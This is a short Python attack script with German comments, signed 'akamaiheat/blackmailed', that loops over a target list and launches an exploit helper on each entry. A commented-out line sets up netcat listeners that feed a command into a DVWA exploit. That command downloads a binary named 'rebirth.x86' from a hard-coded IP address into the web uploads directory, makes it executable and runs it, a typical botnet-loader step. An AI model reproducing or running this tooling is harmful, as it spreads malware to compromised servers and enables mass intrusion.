import os
import subprocess
import sys 
# Dateipfad ersetzen
print("written by akamaiheat/blackmailed") 
with open(sys.argv[1], 'r') as file:
    lines = file.readlines()
    for i, line in enumerate(lines):
        # Netcat-Listener mit dem entsprechenden Port und Argumenten starten
        port = 12345 + i  # Verwende einen Basisport und erhöhe ihn für jede Zeile
      #  subprocess.Popen(["printf 'cd /var/www/html/hackable/uploads;wget http://45.140.142.149/rebirth.x86;chmod 777 rebirth.x86;./rebirth.x86'","|", "nc", "-lvpn", str(port), "|", "python3", "dvwa.py", line.strip(),str(port)], shell=True)
        os.system(f"""python3 main.py {line.strip()}""")
